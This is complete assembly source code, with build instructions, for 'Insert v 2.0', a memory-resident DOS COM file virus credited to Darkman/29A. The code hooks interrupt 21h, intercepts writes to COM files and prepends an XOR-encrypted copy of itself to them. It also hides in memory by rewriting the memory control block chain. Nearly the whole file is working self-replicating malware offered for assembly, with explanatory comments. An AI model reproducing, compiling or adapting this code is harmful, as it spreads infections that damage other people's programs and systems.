   ; comment *
   ;                               Insert v 2.0          ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                                 Code by             ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                               Darkman/29A            ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                                                     ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;   Insert v 2.0 is a 292 bytes parasitic resident COM infector. Infects files
   ;   at write to file by prepending the virus to the infected file. Insert v 2.0
   ;   has an 8-bit exclusive OR (XOR) encryption in file.
   ;
   ;   To compile Insert v 2.0 with Turbo Assembler v 4.0 type:
   ;     TASM /M INSERT20.ASM
   ;     TLINK /t /x INSERT20.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of Insert v 2.0

   code_begin:
            lea     di,crypt_begin  ; DI = offset of crypt_begin
            push    di          ; Save DI at stack

   xor_cryptor  proc    near        ; 8-bit XOR encryptor/decryptor
            mov     cx,(crypt_end-crypt_begin)
   crypt_loop:
   crypt_key    equ     byte ptr $+02h  ; 8-bit encryption/decryption key
            xor     byte ptr [di],00h   ; 8-bit XOR encrypt/decrypt
            inc     di          ; Increase index register
            loop    crypt_loop

            ret             ; Return!
            endp
   crypt_begin:
            mov     di,ds       ; DI = segment of PSP for current ...
            dec     di          ; DI = segment of current Memory C...
            mov     ds,di       ; DS =    "    "     "      "     "

            xor     di,di       ; Zero DI
            cmp     byte ptr [di],'Z'   ; Last block in chain?
            jne     virus_exit      ; Already resident? Jump to virus_...
            mov     byte ptr [di],'M'   ; Not last block in chain
            sub     word ptr [di+03h],(data_end-code_begin+0fh)/10h
            sub     word ptr [di+12h],(data_end-code_begin+0fh)/10h
            mov     es,[di+12h]     ; ES = segment of the virus

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            cld             ; Clear direction flag
            lea     si,mcb      ; SI = offset of mcb
            mov     cl,(mcb_end-mcb)/02h
            rep     movsw       ; Move Memory Control Block (MCB) ...

            lea     si,code_begin   ; SI = offset of code_begin
            mov     cl,(code_end-code_begin)/02h
            rep     movsw       ; Move the virus above Memory Cont...

            mov     ds,cx       ; DS = segment of interrupt table
            lea     di,int21_addr-0f0h  ; DI = offset of int21_addr
            mov     si,(21h*04h)    ; SI = offset of interrupt 21h
            movsw           ; Get interrupt vector 21h
            movsw           ;  "      "       "     "
            mov     word ptr [si-04h],offset int21_virus-0f0h
            mov     [si-02h],es     ; Set interrupt vector 21h
   virus_exit:
            mov     es,cx       ; ES = segment of interrupt table

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     si,restore      ; SI = offset of restore
            mov     di,4f0h         ; DI = offset of Intra-Application...
            mov     cl,(restore_end-restore)
            rep     movsb       ; Move the restore procedure to in...

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     si,code_end     ; SI = offset of code_end
            lea     di,code_begin   ; DI = offset of code_begin
            sub     cx,si       ; CX = number bytes to restore

            push    cs          ; Save CS at stack
            push    di          ; Save DI at stack

            db      0eah        ; JMP imm32 (opcode 0eah)
            dd      004000f0h       ; Address of Intra-Application Com...

   int21_virus  proc    near        ; Interrupt 21h of Insert v 2.0
            cmp     ah,40h      ; Write to file?
            je      infect_file     ; Equal? Jump to infect_file
   int21_exit:
            db      0eah        ; JMP imm32 (opcode 0eah)
   int21_addr   dd      ?           ; Address of interrupt 21h
            endp
   infect_file:
            push    ax cx dx di si ds es

            mov     ax,1220h        ; Get system file table number
            int     2fh

            push    bx          ; Save BX at stack
            mov     ax,1216h        ; Get address of system FCB
            mov     bl,es:[di]      ; BL = system file table entry
            int     2fh
            pop     bx          ; Load BX from stack

            cmp     word ptr es:[di+11h],00h
            jne     infect_exit     ; Filesize too large? Jump to infe...

            cmp     word ptr es:[di+28h],'OC'
            jne     infect_exit     ; COM executable? Jump to infect_exit
            cmp     byte ptr es:[di+2ah],'M'
            jne     infect_exit     ; COM executable? Jump to infect_exit

            cld             ; Clear direction flag
            mov     si,dx       ; SI = offset of buffer for data
            lodsw           ; AX = EXE signature
            cmp     ax,0000111010111111b
            je      infect_exit     ; Already infected? Jump to infect...

            xor     ax,'ZM'             ; Found EXE signature?
            jz      infect_exit     ; Zero? Jump to infect_exit
            xor     ax,('MZ' xor 'ZM')  ; Found EXE signature?
            jz      infect_exit     ; Zero? Jump to infect_exit

            xchg    ax,cx       ; AX = number of bytes to write
            cmp     ax,(code_end-code_begin)*02h
            jb      infect_exit     ; Filesize too small? Jump to infe...
            cmp     ax,0fefah-(code_end-code_begin)
            ja      infect_exit     ; Filesize too large? Jump to infe...

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)
   get_rnd_num:
            in      al,40h      ; AL = 8-bit random number

            or      al,al       ; Weak encryption/decryption key?
            jz      get_rnd_num     ; Zero? Jump to get_rnd_num

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     [crypt_key-0f0h],al ; Store encryption/decryption key

            mov     cx,(code_end-code_begin)
            lea     di,code_end-0f0h    ; DI = offset of code_end
            lea     si,code_begin-0f0h  ; SI = offset of code_begin
            push    cx di       ; Save registers at stack
            rep     movsb       ; Create a copy of the virus

            lea     di,code_end-0e2h    ; DI = offset of code_end + crypt_...
            call    xor_cryptor

            mov     ah,40h      ; Write to file
            pop     dx cx       ; Load registers from stack
            pushf           ; Save flags at stack
            call    [int21_addr-0f0h]
   infect_exit:
            pop     es ds si di dx cx ax

            jmp     int21_exit

   ; The restore procedure is moved to the Intra-Application Communications
   ; Area (ICA) at address: 0040:00F0. It is much more secure to use than fx. the
   ; "hole" above the Interrupt Vector Table (IVT). Still the Intra-Application
   ; Communications Area (ICA) is not secure enough to place an interrupt
   ; handler.
   restore      proc    near        ; Restore the infected file
            rep     movsb       ; Move the original code to beginning

            mov     di,cx       ; Zero DI

            retf            ; Return far!
            endp
   restore_end:
   mcb      db      'Z'                 ; Last block in chain
            dw      08h         ; Memory Control Block (MCB) belon...
            dw      (virus_end-code_begin+0fh)/10h
            db      00h,00h,00h,'SC',06h dup(00h)
   mcb_end:
   virus_name   db      ' [Insert v 2.0]'   ; Name of the virus
   virus_author db      ' [Darkman/29A] '   ; Author of the virus
   crypt_end:
   code_end:
            db      (code_end-code_begin) dup(90h)
   virus_end:
            db      (mcb_end-mcb) dup(90h)
   data_end:
            int     20h         ; Terminate program!

   end      code_begin
